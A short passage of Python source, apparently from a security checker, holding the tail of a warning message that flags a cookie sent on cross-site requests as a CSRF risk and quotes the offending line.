                f"cookie is sent on cross-site requests (CSRF risk). Line: {stripped!r}"
            )
